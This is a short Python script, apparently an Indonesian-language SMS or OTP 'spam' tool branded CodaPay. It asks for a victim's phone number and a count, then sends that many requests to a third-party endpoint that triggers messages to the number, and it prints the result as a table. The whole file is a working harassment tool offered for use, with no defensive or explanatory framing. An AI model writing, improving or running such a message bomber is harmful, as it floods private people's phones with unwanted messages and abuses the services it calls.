#!/usr/bin/python3
# -*- coding: utf-8 -*-
# coded by kereh

from terminaltables import DoubleTable
import requests,sys,time,random

def play(text):
    for x in text + "\n":
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)

def banner():
    banner = """
    +-+-+-+-+-+-+-+
    |C|o|d|a|P|a|y|
    +-+-+-+-+-+-+-+

    Made By Kereh :v
    """
    print(banner)

class Spam():
    def __init__(self):
        self.target = input("[+] number phone : ")
        self.jumlah = int(input("[+] count : "))
        self.url = "http://revan.mohona.tv/"
        self.page = "codapay.php?target={0}".format(self.target)
    def Run(self):
        self.count = 0
        while(self.count < self.jumlah):
            self.r = requests.get(self.url+self.page)
            self.count=self.count+1
        self.data_found = [
                ["\033[1;32mtarget\033[0m","\033[1;33mjumlah\033[0m","\033[1;36mstatus\033[0m"],
                [self.target,self.jumlah,self.r.status_code]
                ]
        self.table = DoubleTable(self.data_found)
        print()
        play("Create Table Please Wait...")
        time.sleep(3)
        print()
        print(self.table.table)


if __name__=="__main__":
    banner()
    Spam().Run()
